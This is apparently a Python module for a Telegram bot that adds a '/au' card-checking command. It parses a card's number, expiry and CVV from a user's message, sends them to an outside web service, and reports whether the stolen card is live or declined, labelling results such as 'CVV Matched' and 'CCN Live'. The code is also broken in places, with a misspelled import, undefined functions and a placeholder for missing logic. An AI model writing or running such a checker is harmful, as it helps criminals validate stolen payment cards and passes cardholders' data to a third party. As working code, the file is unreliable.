from pyrogram import Client, filters
import requests
import re
import timE
from DAXXMUSIC import app


session = requests.session()

def auth_func(r, cc, cvv, mes, ano):
    try:
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        authurl = f"https://www.mainulhasanbd.tk/prvbotauth/api.php?lista={cc}|{mes}|{ano}|{cvv}"
        reqone = session.get(authurl)
        result = reqone.text
        
        if "succeeded" in result:
            response = "CVV Matched ✅"
        elif "insufficient_funds" in result:
            response = "Insufficient Funds ❎"
        elif "incorrect_cvc" in result:
            response = "CCN Live ❎"
        elif "transaction_not_allowed" in result:
            response = "Card Doesn't Support Purchase ❎"
        elif "do_not_honor" in result:
            response = "Do Not Honor 🚫"
        elif "stolen_card" in result:
            response = "Stolen Card 🚫"
        elif "lost_card" in result:
            response = "Lost Card 🚫"
        elif "pickup_card" in result:
            response = "Pickup Card 🚫"
        elif "incorrect_number" in result:
            response = "Incorrect Card Number 🚫"
        elif "expired_card" in result:
            response = "Expired Card 🚫"
        elif "generic_decline" in result:
            response = "Generic Decline 🚫"
        elif "fraudulent" in result:
            response = "Fraudulent 🚫"
        elif "lock_timeout" in result:
            response = "Api Error 🚫"
        elif "Your card was declined." in result:
            response = "Generic Decline 🚫"
        elif "intent_confirmation_challenge" in result:
            response = "Captcha 😥"
        elif "stripe_3ds2_fingerprint" in result:
            response = "3D Secured ❎"
        elif "Your card does not support this type of purchase." in result:
            response = "Locked Card 🚫"
        elif "parameter_invalid_empty" in result:
            response = "404 error 🚫"
        elif "invalid_request_error" in result:
            response = "404 error 🚫"
        else:
            response = "Generic Decline 🚫"
        
        return f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Result - {response}</b>\n"
    
    except Exception as e:
        print(e)

# Define your command handler
@app.on_message(filters.command("au"))
async def authorize(client, message):
    try:
        # Check if a message is replied to or if there's a command argument
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/au '):]
        
        # Validate credit card information
        if len(cc) == 0:
            nocc = """
𝗚𝗜𝗩𝗘 𝗠𝗘 𝗔 𝗩𝗔𝗟𝗜𝗗 𝗖𝗖 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️
            """
            return await message.reply_text(nocc, message.id) 
            
        cards = []
        x = cc
        input = re.findall(r"[0-9]+", x)
        
        # Check if input is valid
        if not input or len(input) < 3:
            nocc = """
𝗚𝗜𝗩𝗘 𝗠𝗘 𝗔 𝗩𝗔𝗟𝗜𝗗 𝗖𝗖 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️
            """
            return await message.reply_text(nocc, message.id) 
        
        if len(input) == 3:
            cc = input[0]
            if len(input[1]) == 3:
                mes = input[2][:2]
                ano = input[2][2:]
                cvv = input[1]
            else:
                mes = input[1][:2]
                ano = input[1][2:]
                cvv = input[2]
        else:
            cc = input[0]
            if len(input[1]) == 3:
                mes = input[2]
                ano = input[3]
                cvv = input[1]
            else:
                mes = input[1]
                ano = input[2]
                cvv = input[3]
            if len(mes) == 2 and (mes > '12' or mes < '01'):
                ano1 = mes
                mes = ano
                ano = ano1
            
        if (cc, mes, ano, cvv):
            cards.append([cc, mes, ano, cvv])
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        # Send initial response
        firstresp = f"""
<b>↯ CHARGE 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - □□□□□
⊗ GATEWAY- Stripe Charge 1$
</b>
        """
        firstchk = await message.reply_text(firstresp, message.id)
        
        # Simulate checking process
        # Add your checking logic here
        
        # Send final response
        finalresp = auth_func("", cc, cvv, mes, ano)
        
        finalchk = await Client.edit_message_text(message.chat.id, firstchk.id, finalresp)
        
        # ANTISPAM TIME SET
        module_name = "antispam_time"
        value = int(time.time())
        updatedata(user_id, module_name, value)
        
        fetch = fetchinfo(user_id)
        credit = int(fetch[5])
        module_name = "credit"
        deduct = credit - 1
        value = deduct
        updatedata(user_id, module_name, value)
        
    except Exception as e:
        print(e)
